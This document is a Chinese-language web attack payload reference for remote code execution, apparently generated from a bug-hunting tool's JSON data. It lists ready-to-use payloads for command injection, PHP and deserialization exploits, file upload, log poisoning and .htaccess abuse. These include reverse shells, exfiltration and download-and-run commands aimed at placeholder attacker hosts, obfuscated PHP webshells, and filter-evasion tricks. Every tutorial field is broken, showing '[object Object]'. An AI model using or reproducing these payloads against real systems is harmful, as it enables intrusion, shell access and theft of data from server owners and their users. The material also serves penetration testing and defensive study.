# RCE远程代码执行 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（12 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. 命令注入

- **id:** `rce-command-injection`
- **分类:** RCE远程代码执行 / 命令注入
- **tags:** `rce` `command` `injection` `os`

操作系统命令注入攻击技术

**前置条件**

- 存在系统命令执行功能
- 用户输入未过滤

**利用步骤**

#### 1. 探测命令注入

```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```

探测命令注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `;` | Linux命令分隔符 | operator |
| `|` | 管道符，传递输出 | operator |
| ``` | 反引号命令替换 | value |
| `$()` | 命令替换语法 | function |
| `&&` | 前命令成功后执行 | operator |
| `||` | 前命令失败后执行 | operator |

#### 2. Linux命令注入

```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

Linux系统命令注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `whoami` | 显示当前用户 | command |
| `nc -e` | Netcat反弹Shell | value |
| `/dev/tcp` | Bash网络重定向 | value |

> platform: `linux`

#### 3. Windows命令注入

```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"
```

Windows系统命令注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `&` | Windows命令分隔符 | operator |
| `certutil` | Windows下载工具 | value |
| `powershell -c` | 执行PowerShell命令 | value |

> platform: `windows`

#### 4. 盲命令注入

```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
通过响应时间差异判断命令是否执行
```

盲命令注入探测

| 片段 | 说明 | 类型 |
|---|---|---|
| `sleep` | Linux延时命令 | keyword |
| `timeout` | Windows延时命令 | value |

#### 5. 外带数据

```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```

通过外带通道获取数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `nslookup` | DNS查询工具 | value |
| `xxd -p` | 转换为十六进制 | value |

> platform: `linux`

**WAF 绕过**

#### 空格绕过

```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```

绕过空格过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `$IFS` | 内部字段分隔符变量 | variable |
| `%09` | Tab字符URL编码 | encoding |
| `{}` | 大括号扩展 | value |

> platform: `linux`

#### 关键字绕过

```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

绕过关键字过滤

> platform: `linux`

#### 编码绕过

```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

使用编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `base64 -d` | Base64解码 | value |
| `printf "\x"` | 十六进制编码 | value |

> platform: `linux`

**教程**

[object Object]

---

### 2. PHP代码执行

- **id:** `rce-php`
- **分类:** RCE远程代码执行 / PHP代码执行
- **tags:** `rce` `php` `code` `execution`

PHP代码执行漏洞利用技术

**前置条件**

- 存在PHP代码执行点
- 用户输入可控制代码

**利用步骤**

#### 1. 常见危险函数

```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```

PHP危险函数

| 片段 | 说明 | 类型 |
|---|---|---|
| `eval()` | 执行字符串作为PHP代码 | function |
| `assert()` | 断言函数，可执行代码 | function |
| `preg_replace /e` | 正则替换执行模式 | value |
| `create_function()` | 动态创建函数 | function |

#### 2. 命令执行

```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```

PHP命令执行函数

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行命令并输出结果 | function |
| `exec()` | 执行命令返回最后一行 | function |
| `shell_exec()` | 执行命令返回全部输出 | function |
| ```` | 反引号执行命令 | value |

#### 3. 一句话木马

```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```

常见一句话木马

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `eval()` | 代码执行 | function |

#### 4. 免杀一句话

```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```

免杀一句话木马

| 片段 | 说明 | 类型 |
|---|---|---|
| `<?php` | 命令/关键字 | command |

**WAF 绕过**

#### 回调函数绕过

```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```

使用回调函数

| 片段 | 说明 | 类型 |
|---|---|---|
| `array_map` | PHP数组映射回调函数 | function |
| `assert` | 执行PHP代码的断言函数 | function |
| `call_user_func` | 调用用户回调函数 | function |
| `$_POST[cmd]` | 从POST参数获取命令 | variable |

#### 变量函数绕过

```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```

WAF绕过技术

| 片段 | 说明 | 类型 |
|---|---|---|
| `$func=$_GET["func"]` | 从GET参数获取函数名 | variable |
| `$cmd=$_GET["cmd"]` | 从GET参数获取命令 | variable |
| `$func($cmd)` | 变量函数调用，动态执行 | technique |

**教程**

[object Object]

---

### 3. PHP Filter链RCE

- **id:** `rce-php-filter`
- **分类:** RCE远程代码执行 / PHP Filter链
- **tags:** `rce` `php` `filter` `chain`

利用PHP Filter链构造RCE

**前置条件**

- 存在文件包含漏洞
- PHP版本支持Filter链

**利用步骤**

#### 1. Filter链原理

```
利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码
```

Filter链原理

| 片段 | 说明 | 类型 |
|---|---|---|
| `利用php://filter的convert.base64-decode等过滤器 通过精心构造的输入，最终生成可执行代码` | 攻击载荷 | value |

#### 2. 构造Filter链

```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
使用多个过滤器串联
```

构造Filter链

| 片段 | 说明 | 类型 |
|---|---|---|
| `php://filter` | PHP过滤器协议 | value |
| `convert.base64-decode` | Base64解码过滤器 | value |
| `resource=` | 指定资源 | value |

#### 3. 使用工具生成

```
# 使用php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# 输出可直接使用的Filter链
```

使用工具生成Filter链

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 使用php_filter_chain_generator python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"  # 输出可直接使用的Filter链` | 参数与载荷内容 | value |

#### 4. 完整利用示例

```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```

完整Filter链示例

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.` | 攻击载荷 | value |

**WAF 绕过**

#### 编码绕过

```
使用不同编码过滤器组合
绕过关键字检测
```

编码组合绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用不同编码过滤器组合 绕过关键字检测` | 攻击载荷 | value |

**教程**

[object Object]

---

### 4. 盲命令注入

- **id:** `rce-cmd-blind`
- **分类:** RCE远程代码执行 / 盲命令注入
- **tags:** `rce` `blind` `command` `injection`

无回显的命令注入利用技术

**前置条件**

- 存在命令注入点
- 无直接回显

**利用步骤**

#### 1. 时间盲注

```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
观察响应时间判断命令是否执行
```

使用延时判断

| 片段 | 说明 | 类型 |
|---|---|---|
| `sleep 5` | Linux延时命令 | value |
| `timeout 5` | Windows延时命令 | value |

#### 2. DNS外带

```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```

DNS外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `nslookup` | DNS查询工具 | value |
| `$(whoami)` | 命令替换获取用户名 | value |
| `.attacker.com` | 攻击者控制的域名 | domain |

#### 3. HTTP外带

```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```

HTTP外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `; curl http://attacker.com/?data=$(whoami) ; wget http://attacker.com/?data=$(i` | 攻击载荷 | value |

#### 4. ICMP外带

```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
在攻击者服务器监听ICMP包
```

ICMP外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `; ping -p $(echo "test" | xxd -p) attacker.com ; tcpdump -i eth0 icmp 在攻击者服务器监` | 攻击载荷 | value |

> platform: `linux`

#### 5. 反弹Shell

```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

反弹Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1" ; nc -e /bin/bash attacker 4` | 攻击载荷 | value |

**WAF 绕过**

#### 编码绕过

```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash
使用Base64编码绕过
```

Base64编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `;` | 命令/载荷起始 | command |
| ` echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash 使用Base64编码绕过` | 参数与载荷内容 | value |

> platform: `linux`

**教程**

[object Object]

---

### 5. 反序列化漏洞

- **id:** `rce-deserialize`
- **分类:** RCE远程代码执行 / 反序列化
- **tags:** `rce` `deserialize` `java` `php`

利用反序列化漏洞实现RCE

**前置条件**

- 存在反序列化点
- 存在可利用的Gadget链

**利用步骤**

#### 1. Java反序列化

```
# 常见漏洞组件
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"
```

Java反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `ysoserial` | Java反序列化利用工具 | value |
| `CommonsCollections1` | 利用链名称 | encoding |

#### 2. PHP反序列化

```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```

PHP反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

#### 3. Python反序列化

```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# 发送payload触发反序列化
```

Python pickle反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `import` | 命令/关键字 | command |

#### 4. .NET反序列化

```
# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# 常见格式
BinaryFormatter
Json.NET
XMLSerializer
```

.NET反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 使用ysoserial.net ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"` | 攻击载荷 | value |

> platform: `windows`

**WAF 绕过**

#### 签名绕过

```
如果存在签名验证
需要获取密钥重新签名
```

绕过签名验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `如果存在签名验证 需要获取密钥重新签名` | 攻击载荷 | value |

**教程**

[object Object]

---

### 6. PHP反序列化

- **id:** `rce-deserialize-php`
- **分类:** RCE远程代码执行 / PHP反序列化
- **tags:** `rce` `php` `deserialize` `unserialize`

PHP反序列化漏洞利用技术

**前置条件**

- 存在unserialize调用
- 存在可利用的类

**利用步骤**

#### 1. 魔术方法

```
__construct() - 对象创建时调用
__destruct() - 对象销毁时调用
__wakeup() - 反序列化时调用
__toString() - 对象转字符串时调用
__call() - 调用不存在方法时触发
```

PHP魔术方法

| 片段 | 说明 | 类型 |
|---|---|---|
| `__destruct()` | 对象销毁时自动调用，常作为POP链的入口点 | command |
| `__wakeup()` | 反序列化时自动调用，可被CVE-2016-7124绕过 | command |
| `__toString()` | 对象转字符串时触发，如echo/print/字符串拼接 | command |
| `__call()` | 调用不存在方法时触发，可用于动态方法跳转 | command |

#### 2. 构造POP链

```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```

构造POP链

| 片段 | 说明 | 类型 |
|---|---|---|
| `class Chain` | 入口类，__destruct触发时调用obj的action方法 | command |
| `$this->obj->action()` | 链式调用，通过对象属性跳转到目标类方法 | operator |
| `system($this->cmd)` | 最终执行系统命令的sink点 | value |
| `serialize($payload)` | 将构造好的对象链序列化为字符串payload | command |

#### 3. Phar反序列化

```
# 生成Phar文件
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# 触发反序列化
phar://exploit.phar/test.txt
```

Phar反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `new Phar()` | 创建Phar归档文件对象 | command |
| `setStub()` | 设置Phar文件头标识，__HALT_COMPILER()为必需结束符 | parameter |
| `setMetadata($o)` | 设置元数据为恶意对象，读取Phar时自动反序列化 | value |
| `phar://exploit.phar` | phar://流包装器触发元数据反序列化 | command |

#### 4. Session反序列化

```
# 利用Session处理器差异
# php_serialize vs php_binary
构造恶意Session数据触发反序列化
```

Session反序列化

| 片段 | 说明 | 类型 |
|---|---|---|
| `php_serialize` | Session序列化处理器，使用标准serialize格式 | parameter |
| `php_binary` | 另一种Session处理器，使用二进制格式 | parameter |
| `处理器差异` | 不同处理器的分隔符不同导致注入恶意序列化数据 | value |

**WAF 绕过**

#### 属性修饰符绕过

```
使用public/private/protected属性
注意序列化格式差异:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```

属性修饰符处理

| 片段 | 说明 | 类型 |
|---|---|---|
| `public: s:3:"cmd"` | 公有属性直接序列化属性名 | value |
| `private: s:8:"\0Class\0cmd"` | 私有属性前后加\\0和类名，长度包含null字节 | value |
| `protected: s:7:"\0*\0cmd"` | 受保护属性前后加\\0和*号 | value |

**教程**

[object Object]

---

### 7. Java反序列化

- **id:** `rce-deserialize-java`
- **分类:** RCE远程代码执行 / Java反序列化
- **tags:** `rce` `java` `deserialize` `ysoserial`

Java反序列化漏洞利用技术

**前置条件**

- 存在Java反序列化点
- 存在Gadget链

**利用步骤**

#### 1. 常见Gadget链

```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK原生Gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```

常见Gadget链

| 片段 | 说明 | 类型 |
|---|---|---|
| `CommonsCollections` | Apache CC库Gadget链，最经典的Java反序列化利用链 | command |
| `CommonsBeanutils` | Apache BeanUtils Gadget，利用属性访问触发执行 | command |
| `Jdk7u21` | JDK原生Gadget，无需第三方依赖，利用AnnotationInvocationHandler | command |
| `Hibernate` | Hibernate ORM Gadget，利用HQL查询触发代码执行 | command |

#### 2. 使用ysoserial

```
# 列出所有Gadget
java -jar ysoserial.jar

# 生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

使用ysoserial生成payload

| 片段 | 说明 | 类型 |
|---|---|---|
| `java -jar ysoserial.jar` | 运行ysoserial反序列化payload生成工具 | command |
| `CommonsCollections1` | 指定使用的Gadget链名称 | parameter |
| `"curl attacker.com/shell.sh|bash"` | 要执行的系统命令（反弹Shell常用） | value |
| `> payload.ser` | 将生成的序列化数据保存为二进制文件 | operator |
| `{echo,BASE64}|{base64,-d}|{bash,-i}` | Bash花括号扩展绕过空格和特殊字符限制 | value |

#### 3. JRMP攻击

```
# 启动JRMP服务
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# 发送JRMP客户端payload
java -jar ysoserial.jar JRMPClient attacker:4444
```

JRMP攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `ysoserial.exploit.JRMPListener` | 启动JRMP恶意服务端，等待目标连接 | command |
| `4444` | JRMP监听端口 | value |
| `CommonsCollections1` | 服务端返回给客户端的Gadget链类型 | parameter |
| `JRMPClient` | 生成JRMP客户端payload，目标反序列化后连接攻击者 | command |

#### 4. 内存马注入

```
# 使用ysoserial注入内存马
java -jar ysoserial.jar CommonsCollections1 "生成内存马字节码"

# 或使用工具
java -jar ysuserial.jar CommonsCollections1 "内存马命令"
```

内存马注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `内存马` | 无文件WebShell，注入到JVM内存中的Servlet/Filter/Listener | command |
| `字节码` | 编译后的Java类字节码，运行时动态加载 | parameter |
| `CommonsCollections1` | 利用CC链触发ClassLoader加载恶意字节码 | value |

**WAF 绕过**

#### 二次反序列化

```
使用SignedObject或RMI绕过黑名单
```

二次反序列化绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `SignedObject` | JDK内置类，包装另一个序列化对象绕过黑名单检测 | command |
| `RMI` | 远程方法调用，通过网络传输序列化对象绕过本地检测 | command |

#### 反射绕过

```
使用反射设置属性绕过限制
```

反射绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `反射` | Java反射机制在运行时动态修改对象属性绕过限制 | command |
| `setAccessible(true)` | 突破private访问限制，修改私有字段值 | parameter |

**教程**

[object Object]

---

### 8. 文件上传漏洞

- **id:** `rce-file-upload`
- **分类:** RCE远程代码执行 / 文件上传
- **tags:** `rce` `upload` `webshell` `file`

利用文件上传漏洞获取RCE

**前置条件**

- 存在文件上传功能
- 可上传可执行文件

**利用步骤**

#### 1. 基础上传

```
上传PHP文件: shell.php
上传JSP文件: shell.jsp
上传ASPX文件: shell.aspx
上传CGI文件: shell.cgi
```

直接上传可执行文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `shell.php` | PHP WebShell文件，服务器会直接解析执行 | value |
| `shell.jsp` | Java WebShell，运行在Tomcat/JBoss等容器 | value |
| `shell.aspx` | .NET WebShell，运行在IIS服务器 | value |

#### 2. 前端绕过

```
# 修改Content-Type
Content-Type: image/jpeg

# 修改文件扩展名
test.php -> test.jpg.php
test.php -> test.php.jpg

# 使用空字节
test.php%00.jpg
```

绕过前端验证

| 片段 | 说明 | 类型 |
|---|---|---|
| `Content-Type: image/jpeg` | 修改MIME类型欺骗前端/后端验证 | parameter |
| `test.php.jpg` | 双后缀名，部分服务器从左到右解析取第一个 | value |
| `test.php%00.jpg` | 空字节截断（PHP<5.3.4），%00后的内容被忽略 | value |

#### 3. 后端绕过

```
# 黑名单绕过
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# 大小写绕过
.Php, .pHp, .PHP

# 双写绕过
.pphphp
```

绕过后端黑名单

| 片段 | 说明 | 类型 |
|---|---|---|
| `.phtml, .php3, .php5, .pht` | PHP的替代扩展名，不在常见黑名单中 | value |
| `.Php, .pHp` | 大小写混合绕过Windows不区分大小写的文件系统 | value |
| `.pphphp` | 双写绕过，后端删除php后剩余拼接为.php | value |

#### 4. 图片马

```
# 制作图片马
copy test.jpg/b + shell.php/a shell.jpg

# 利用文件包含执行
include($_GET['file']);
?file=upload/shell.jpg
```

制作图片马

#### 5. .htaccess上传

```
# 上传.htaccess文件
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 之后上传的jpg文件会被当作PHP执行
```

利用.htaccess

| 片段 | 说明 | 类型 |
|---|---|---|
| `AddType application/x-httpd-php .jpg` | 让Apache将.jpg文件当作PHP脚本解析 | command |
| `AddHandler php-script .jpg` | 另一种配置方式，为.jpg添加PHP处理器 | command |

> platform: `linux`

**WAF 绕过**

#### Content-Type绕过

```
修改请求中的Content-Type为允许的类型
image/jpeg, image/png, image/gif
```

Content-Type绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `Content-Type` | HTTP请求头中的MIME类型字段 | parameter |
| `image/jpeg` | 伪装为JPEG图片的MIME类型绕过服务端检测 | value |
| `image/png, image/gif` | 其他常见的白名单MIME类型 | value |

#### 文件头绕过

```
在恶意文件前添加图片文件头
GIF89a<?php eval($_POST[cmd]);?>
```

文件头绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `GIF89a` | GIF文件魔术头（文件签名），6字节 | command |
| `<?php eval([cmd]);?>` | 在文件头之后追加PHP代码 | value |

**教程**

[object Object]

---

### 9. 文件包含RCE

- **id:** `rce-include`
- **分类:** RCE远程代码执行 / 文件包含
- **tags:** `rce` `include` `lfi` `rfi`

利用文件包含漏洞实现RCE

**前置条件**

- 存在文件包含漏洞
- 可包含恶意文件

**利用步骤**

#### 1. 日志投毒

```
# 注入代码到日志
User-Agent: <?php system($_GET['cmd']);?>

# 包含日志文件
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```

日志投毒RCE

| 片段 | 说明 | 类型 |
|---|---|---|
| `/var/log/apache2/access.log` | Apache访问日志 | path |
| `/var/log/nginx/access.log` | Nginx访问日志 | path |

> platform: `linux`

#### 2. Session文件包含

```
# 注入代码到Session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# Session内容
<?php system($_GET['cmd']);?>
```

Session文件包含

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

> platform: `linux`

#### 3. /proc/self/environ

```
# 注入代码到环境变量
User-Agent: <?php system($_GET['cmd']);?>

# 包含环境变量文件
?file=/proc/self/environ&cmd=whoami
```

包含环境变量

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

> platform: `linux`

#### 4. PHP伪协议

```
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data://协议
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```

PHP伪协议利用

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 执行系统命令 | function |
| `php://input` | PHP原始输入流 | technique |

#### 5. 远程文件包含

```
# RFI直接包含远程Shell
?file=http://attacker.com/shell.txt

# shell.txt内容
<?php system($_GET['cmd']);?>
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

**WAF 绕过**

#### 编码绕过

```
?file=%2fvar%2flog%2fapache2%2faccess.log
URL编码路径
```

URL编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `?file=%2fvar%2flog%2fapache2%2faccess.log URL编码路径` | 攻击载荷 | value |

**教程**

[object Object]

---

### 10. 日志投毒RCE

- **id:** `rce-log-poison`
- **分类:** RCE远程代码执行 / 日志投毒
- **tags:** `rce` `log` `poison` `lfi`

利用日志投毒实现RCE

**前置条件**

- 存在文件包含漏洞
- 可读取日志文件

**利用步骤**

#### 1. Apache日志投毒

```
# 注入代码到访问日志
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志执行
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```

Apache日志投毒

| 片段 | 说明 | 类型 |
|---|---|---|
| `/var/log/apache2/access.log` | Debian/Ubuntu日志路径 | path |
| `/var/log/httpd/access_log` | CentOS/RHEL日志路径 | path |

> platform: `linux`

#### 2. Nginx日志投毒

```
# 注入代码
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志
?file=/var/log/nginx/access.log&cmd=whoami
```

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |
| `curl` | HTTP请求工具 | command |

**WAF 绕过**

#### 编码绕过

```
使用URL编码或Base64编码绕过关键字过滤
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用URL编码或Base64编码绕过关键字过滤` | 攻击载荷 | value |

**教程**

[object Object]

---

### 11. 图片马RCE

- **id:** `rce-image`
- **分类:** RCE远程代码执行 / 图片马
- **tags:** `rce` `image` `webshell` `upload`

利用图片马实现RCE

**前置条件**

- 存在文件上传
- 存在文件包含

**利用步骤**

#### 1. 制作图片马

```
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# 在图片末尾添加PHP代码
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```

制作图片马

| 片段 | 说明 | 类型 |
|---|---|---|
| `copy test.jpg/b + shell.php/a` | Windows下将图片和PHP代码二进制合并 | command |
| `cat test.jpg shell.php > shell.jpg` | Linux下拼接图片和PHP代码 | command |
| `echo "<?php ...?>" >> test.jpg` | 在图片末尾追加PHP代码 | command |

#### 2. 图片马内容

```
GIF89a
<?php @eval($_POST[cmd]);?>

# 或使用Exif注释
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```

图片马格式

| 片段 | 说明 | 类型 |
|---|---|---|
| `GIF89a` | GIF文件头魔术字节，用于通过文件头检测 | command |
| `<?php @eval($_POST[cmd]);?>` | 一句话木马，@抑制错误信息 | value |
| `exiftool -Comment=` | 将PHP代码写入图片EXIF注释字段，更隐蔽 | command |

#### 3. 利用文件包含执行

```
# 配合文件包含漏洞
?file=upload/shell.jpg
POST: cmd=system('whoami');

# 配合phar://
?file=phar://upload/shell.jpg
```

文件包含执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `system()` | 系统命令执行 | function |

#### 4. 配合.htaccess

```
# 上传.htaccess
AddType application/x-httpd-php .jpg

# 直接访问图片执行
http://target/upload/shell.jpg
```

配合.htaccess执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `AddType application/x-httpd-php .jpg` | Apache配置将.jpg按PHP解析 | command |
| `http://target/upload/shell.jpg` | 直接访问图片触发PHP执行，无需文件包含 | value |

> platform: `linux`

**WAF 绕过**

#### 文件头伪装

```
使用真实图片文件头
确保图片可正常预览
```

文件头伪装

| 片段 | 说明 | 类型 |
|---|---|---|
| `真实图片文件头` | 使用完整的图片文件头（如JPEG的FF D8 FF E0） | command |
| `可正常预览` | 确保图片能正常打开显示，避免文件完整性检查失败 | parameter |

**教程**

[object Object]

---

### 12. .htaccess利用

- **id:** `rce-htaccess`
- **分类:** RCE远程代码执行 / .htaccess
- **tags:** `rce` `htaccess` `apache` `upload`

利用.htaccess文件实现RCE

**前置条件**

- Apache服务器
- 可上传.htaccess

**利用步骤**

#### 1. 解析其他扩展名

```
# 让.jpg文件作为PHP执行
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 让.txt文件作为PHP执行
AddType application/x-httpd-php .txt
```

修改文件类型解析

| 片段 | 说明 | 类型 |
|---|---|---|
| `AddType` | 设置MIME类型 | value |
| `AddHandler` | 设置处理程序 | value |

> platform: `linux`

#### 2. 自动包含

```
# 自动在每个文件前包含
php_value auto_prepend_file /var/www/html/shell.php

# 自动在每个文件后包含
php_value auto_append_file /var/www/html/shell.php
```

自动包含文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 自动在每个文件前包含 php_value auto_prepend_file /var/www/html/shell.php  # 自动在每个文件后包含 php_value auto_append_file /var/www/html/shell.php` | 参数与载荷内容 | value |

> platform: `linux`

#### 3. 伪静态RCE

```
# 利用mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# 更危险的配置
SetHandler application/x-httpd-php
```

伪静态配置

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 利用mod_rewrite RewriteEngine on RewriteRule ^(.*)$ $1 [L]  # 更危险的配置 SetHandler application/x-httpd-php` | 参数与载荷内容 | value |

> platform: `linux`

#### 4. 错误页面包含

```
# 自定义错误页面
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```

错误页面利用

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
